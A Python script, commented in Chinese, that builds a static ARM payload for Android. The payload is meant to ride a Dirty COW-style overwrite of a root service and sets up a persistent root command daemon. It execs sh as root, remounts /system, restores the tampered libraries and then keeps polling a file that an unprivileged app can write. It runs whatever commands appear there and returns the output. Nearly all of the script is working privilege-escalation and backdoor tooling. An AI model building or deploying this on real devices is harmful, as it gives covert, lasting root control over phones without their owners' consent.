#!/usr/bin/env python3
"""生成「root 命令守护进程」静态 ARM payload。

思路
----
Dirty COW（或任何能篡改 root 服务的手段）只能换来**一次** root 执行机会。
一次性载荷做完就退出，root 也就没了。

这里把那次机会变成**常驻的命令守护进程**：payload 只做一件事 ——
execve 成 `sh -c "<长脚本>"`；脚本先收拾现场，最后进入一个
`while true` 循环，每 N 秒看一眼命令文件，有就以 root 执行、把输出写进
结果文件。于是：

    app(uid 10055) 写 $B/rcmd.sh  →  root 守护执行  →  输出到 $B/rout.txt

得到一个不依赖 adb、不依赖 setuid、不依赖 no_new_privs 的稳定 root 通道
（重启后需要重新打一次，持久化见 docs/03 第五步）。

payload 的四条硬性要求（每条都踩过）
------------------------------------
1. `-nostdlib -static`，无 PT_INTERP，`Type=EXEC`，entry >= 0x8000
   （大于 mmap_min_addr）。本脚本编完会自动用 readelf 校验。
2. `envp` 必须非空且含 PATH —— 传 NULL 会让 sh 里每个命令都 "not found"。
3. 第一件事必须是 execve 成 sh：payload 的代码页就是被篡改文件的 page cache，
   自己覆盖自己等于自杀。execve 之后地址空间换掉，再改文件才安全。
4. 命令串里不能有 `"` 和 `\\`（要写进 `.asciz "..."`）。需要引号时用
   `echo 'A'$?'B'` 这种单引号拼接。

用法
----
    # 最简：只生成守护循环，工作目录 /data/local/tmp/rootd
    python3 tools/make_daemon_payload.py --out out/payload

    # 典型：先把被我们打坏的 .so 还原，再起守护
    python3 tools/make_daemon_payload.py \\
        --device-dir /data/local/tmp/rootd \\
        --restore libfoo.so.orig:/system/lib/libfoo.so \\
        --restore libbar.so.orig:/system/lib/libbar.so \\
        --out out/payload

    --restore NAME:DEST   把 $B/NAME 还原到 DEST（dd），DEST 是之前被填 0xFF 的 .so

环境变量（命令行优先级更高）
    T3_DEVICE_DIR     设备上的工作目录（$B），默认 /data/local/tmp/rootd
    T3_CROSS_GCC      交叉编译器路径，默认 arm-linux-gnueabihf-gcc
    T3_CROSS_READELF  对应的 readelf
    T3_CROSS_LIBDIR   交叉编译器的 LD_LIBRARY_PATH（工具链是手工解包时用得上）
"""
import argparse
import os
import subprocess
import sys

DEFAULT_DEVICE_DIR = os.environ.get("T3_DEVICE_DIR", "/data/local/tmp/rootd")
DEFAULT_GCC = os.environ.get("T3_CROSS_GCC", "arm-linux-gnueabihf-gcc")
DEFAULT_READELF = os.environ.get("T3_CROSS_READELF", "arm-linux-gnueabihf-readelf")
DEFAULT_LIBDIR = os.environ.get("T3_CROSS_LIBDIR", "")

ASM = r'''@ root 命令守护 payload —— 由 tools/make_daemon_payload.py 生成
@ 只做一件事：execve("/system/bin/sh", argv, envp)，argv 为 sh -c <CMD>
    .syntax unified
    .arm
    .text
    .global _start

_start:
    ldr     r0, =p_sh
    ldr     r1, =argv
    ldr     r2, =envp
    mov     r7, #11                 @ __NR_execve
    svc     #0
    mov     r0, #0x7f               @ execve 失败也不能返回：返回会跑飞
    mov     r7, #1                  @ __NR_exit
    svc     #0

    .align 2
p_sh:   .asciz "/system/bin/sh"
s_sh:   .asciz "sh"
s_c:    .asciz "-c"
s_path: .asciz "PATH=/system/bin:/system/xbin:/sbin:/vendor/bin"
s_home: .asciz "HOME={home}"

s_cmd:
    .asciz "{cmd}"

    .align 2
argv:
    .word s_sh
    .word s_c
    .word s_cmd
    .word 0
envp:
    .word s_path
    .word s_home
    .word 0
'''


def build_cmd(device_dir, restores, proof, poll, remount, extra):
    """拼出 payload 要执行的 sh 命令串。"""
    parts = [
        "export PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
        "B=" + device_dir,
    ]

    if remount:
        parts.append("mount -o rw,remount /system >/dev/null 2>&1")

    # 先把自己造成的破坏收拾干净：只还原 .so。
    # 目标二进制保持被篡改状态 —— 我们正从它运行，一旦还原，
    # 下次 init 重启就会跑回原程序，守护进程随之消失。
    for bk, dest in restores:
        parts.append(f"dd if=$B/{bk} of={dest} >/dev/null 2>&1")

    if remount:
        parts += ["sync", "mount -o ro,remount /system >/dev/null 2>&1"]

    # 留痕：证明这条路真的跑通了
    parts.append(f"id > $B/{proof} 2>&1")
    parts.append(f"echo ROOTDAEMON_START >> $B/{proof}")
    parts.append(f"date >> $B/{proof} 2>/dev/null")

    if extra:
        parts.append(extra)

    # 常驻 root 命令循环：mv 原子交付 → 执行 → 追加带退出码的结束标记
    parts.append(
        "while true; do "
        f"if [ -f $B/rcmd.sh ]; then "
        "mv $B/rcmd.sh $B/rcmd.run 2>/dev/null; "
        "if [ -f $B/rcmd.run ]; then "
        "sh $B/rcmd.run > $B/rout.txt 2>&1; "
        "echo '##EXIT='$?'##' >> $B/rout.txt; "
        "rm -f $B/rcmd.run; "
        "fi; "
        "fi; "
        f"sleep {poll}; "
        "done"
    )
    return "; ".join(parts)


def main():
    ap = argparse.ArgumentParser(
        description="生成 root 命令守护进程的静态 ARM payload",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__)
    ap.add_argument("--out", required=True, help="输出的 payload 路径")
    ap.add_argument("--device-dir", default=DEFAULT_DEVICE_DIR,
                    help=f"设备上的工作目录 $B（默认 {DEFAULT_DEVICE_DIR}）")
    ap.add_argument("--restore", action="append", default=[], metavar="NAME:DEST",
                    help="把 $B/NAME 还原到 DEST，可重复")
    ap.add_argument("--proof", default="ROOT_PROOF.txt", help="留痕文件名")
    ap.add_argument("--poll", type=int, default=2, help="轮询间隔秒数（默认 2）")
    ap.add_argument("--extra", default="", help="插在守护循环之前的额外 sh 片段")
    ap.add_argument("--no-remount", dest="remount", action="store_false",
                    help="不做 /system remount（目标不在 /system 时用）")
    ap.add_argument("--gcc", default=DEFAULT_GCC, help="交叉编译器")
    ap.add_argument("--readelf", default=DEFAULT_READELF, help="readelf")
    ap.add_argument("--libdir", default=DEFAULT_LIBDIR,
                    help="交叉编译器的 LD_LIBRARY_PATH")
    ap.add_argument("--keep-asm", action="store_true", help="保留生成的 .S")
    args = ap.parse_args()

    device_dir = args.device_dir.rstrip("/")
    if not device_dir:
        sys.exit("--device-dir 不能为空")
    if any(c.isspace() for c in device_dir):
        sys.exit("--device-dir 不能含空白字符（要拼进 sh 命令串）")
    if args.poll < 1:
        sys.exit("--poll 必须 >= 1")

    restores = []
    for spec in args.restore:
        if ":" not in spec:
            sys.exit(f"--restore 需要 NAME:DEST 形式，收到 {spec!r}")
        bk, dest = spec.split(":", 1)
        if not bk or not dest:
            sys.exit(f"--restore 解析失败: {spec!r}")
        restores.append((bk, dest))

    cmd = build_cmd(device_dir, restores, args.proof, args.poll,
                    args.remount, args.extra)

    bad = [c for c in ('"', "\\") if c in cmd]
    if bad:
        sys.exit(f"命令串里含无法放进 .asciz 的字符 {bad}，请改 --extra")

    out = args.out
    os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)

    # 先用本地 sh -n 做语法自检（只解析，不执行）
    chk = out + ".check.sh"
    with open(chk, "w") as f:
        f.write(cmd + "\n")
    r = subprocess.run(["sh", "-n", chk], capture_output=True, text=True)
    if r.returncode != 0:
        sys.exit("命令串 sh 语法错误:\n" + r.stderr[:800])
    print(f"  命令串 {len(cmd)} 字符，sh -n 语法 OK")

    asm_path = out + ".S"
    with open(asm_path, "w") as f:
        f.write(ASM.format(home=device_dir, cmd=cmd))

    env = dict(os.environ)
    if args.libdir:
        env["LD_LIBRARY_PATH"] = args.libdir
    r = subprocess.run(
        [args.gcc, "-nostdlib", "-static", "-Wl,-N", "-Wl,-e,_start",
         "-Wl,--build-id=none", "-o", out, asm_path],
        env=env, capture_output=True, text=True)
    if r.returncode != 0:
        sys.exit("编译失败:\n" + r.stderr[-2000:])

    # 校验：Type=EXEC、无 INTERP、entry >= mmap_min_addr
    rh = subprocess.run([args.readelf, "-h", out], env=env,
                        capture_output=True, text=True)
    rl = subprocess.run([args.readelf, "-l", out], env=env,
                        capture_output=True, text=True)
    etype = entry = "?"
    for line in rh.stdout.splitlines():
        if "Type:" in line:
            etype = line.split("Type:")[1].strip()
        if "Entry point" in line:
            entry = line.split("address:")[1].strip()
    n_interp = rl.stdout.count("INTERP")
    try:
        entry_ok = int(entry, 16) >= 0x8000
    except ValueError:
        entry_ok = False
    size = os.path.getsize(out)
    ok = n_interp == 0 and etype.startswith("EXEC") and entry_ok

    print(f"  {'✓' if ok else '✗'} {out}  {size} 字节  "
          f"Type={etype} Entry={entry} INTERP={n_interp}")
    print(f"    校验: {'PASS' if ok else 'FAIL'} "
          f"(EXEC={etype.startswith('EXEC')} entry>=0x8000={entry_ok} "
          f"no-INTERP={n_interp == 0})")

    if not args.keep_asm:
        os.unlink(asm_path)
    for p in (chk,):
        os.unlink(p)

    if not ok:
        sys.exit(2)


if __name__ == "__main__":
    main()
